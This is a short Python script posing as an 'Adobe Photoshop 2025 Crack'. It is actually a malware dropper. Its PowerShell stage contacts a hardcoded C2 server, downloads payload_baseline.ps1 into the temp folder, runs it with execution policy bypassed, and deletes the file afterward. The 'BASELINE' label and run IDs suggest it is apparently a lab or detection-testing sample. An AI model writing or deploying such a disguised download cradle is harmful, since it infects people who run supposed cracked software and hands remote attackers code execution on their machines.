#!/usr/bin/env python3
"""
Adobe Photoshop 2025 Crack - BASELINE Version
"""

import subprocess
import uuid
import time

# ============================================================
# CONFIGURATION
# ============================================================
RUN_ID = uuid.uuid4().hex[:8]
C2_SERVER = "http://192.168.10.105:80"

print("")
print("=" * 56)
print("  Adobe Photoshop 2025 Crack v3.0 (BASELINE)")
print(f"  RunId: {RUN_ID}")
print("=" * 56)

print("")
print("[PHASE 1] Downloading crack payload...")
print(f"  RunId: {RUN_ID}")

# Cách đúng: tải file .ps1 về, chạy bằng &, truyền tham số đúng
ps_cmd = f"""
Write-Host '[PHASE1_BASELINE] Connecting to C2...' -ForegroundColor Cyan
$url = "{C2_SERVER}/payload_baseline.ps1"
$scriptPath = "$env:TEMP\\payload_baseline_{RUN_ID}.ps1"

try {{
    Invoke-WebRequest -Uri $url -OutFile $scriptPath -UseBasicParsing -TimeoutSec 10
    Write-Host '  [+] Payload downloaded successfully' -ForegroundColor Green
    & $scriptPath -RunId {RUN_ID}
}} catch {{
    Write-Host "  [!] Error: $_" -ForegroundColor Red
}} finally {{
    if (Test-Path $scriptPath) {{ Remove-Item $scriptPath -Force }}
}}

Write-Host ''
Write-Host '============================================================' -ForegroundColor Green
Write-Host '  PowerShell script completed.'
Write-Host '============================================================' -ForegroundColor Green
"""

stage2_proc = subprocess.Popen([
    "powershell.exe", "-ExecutionPolicy", "Bypass", "-NoProfile",
    "-Command", ps_cmd
])

print("  [+] Download cradle executed")
stage2_exit = stage2_proc.wait()
print(f"  [+] Stage 2 PowerShell exited with code {stage2_exit}")
print("")
print("=" * 56)
print("  Phase 1 completed")
print("=" * 56)

print("")
try:
    input("Press Enter to exit...")
except EOFError:
    pass
